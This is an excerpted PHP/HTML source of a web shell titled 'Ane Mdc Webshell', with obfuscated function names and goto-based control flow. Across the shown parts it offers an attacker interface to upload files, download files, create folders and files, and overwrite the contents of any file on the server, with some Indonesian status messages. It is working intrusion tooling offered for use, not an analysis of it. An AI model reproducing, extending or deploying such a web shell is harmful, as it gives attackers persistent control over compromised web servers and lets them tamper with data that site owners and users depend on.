...
<meta property="og:title" content="Ane Mdc Webshell" />
<meta property="og:description" content="" />
<meta name="theme-color" content="lime">
<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
<title>Ane Mdc Webshell</title>
...
<a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px lime;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">Ane Mdc Webshell</span></a> 
</div>
...
<input type="submit" value="Upload" name="submit" class="ohct">
<?php
if (!isset($_FILES["f"])) {
    goto ea;
}
...
if (move_uploaded_file($_FILES["f"]["tmp_name"][$index], $files[$index])) {
    goto PG;
}
...
header("Content-Length: " . filesize(JD($_GET["n"])));
...
Fg:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid lime;border-radius:5px;">New Folder Name :</h5>
<form method="post">
...
Pb:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid lime;border-radius:5px;">New File Name :</h5>
<form method="post">
<div class="form-group">
...
<?php
if (isset($_POST["s"])) {
    if (file_exists("{$Jd}/{$_POST["n"]}")) {
        xE("file name has been used", 0, "&a=" . SS("newFile"));
    } else {
        if (file_put_contents("{$Jd}/{$_POST["n"]}", $_POST["ctn"])) {
...
Ox:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid lime;border-radius:5px;">Edit File Name : <font color="white"><?= Jd(
    $_GET["n"]
) ?></font></h5>
<form method="post">
<div class="form-group">
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control border"><?= $c8[18](
    file_get_contents($Jd . "/" . jD($_GET["n"]))
) ?></textarea>
</div>
<div class="form-group" style="margin-top: 10px;">
<button type="submit" name="s" class="ohct">Save</button>
...
<?php
if (isset($_POST["s"])) {
    if (file_put_contents($Jd . "/" . jD($_GET["n"]), $_POST["ctn"])) {
        xe(
            "konten file berhasil diubah",
            1,
            "&a=" . sS("view") . "&n={$_GET["n"]}"
        );
    } else {
        xE("konten file gagal diubah");
    }
}
goto WC;
Ag:
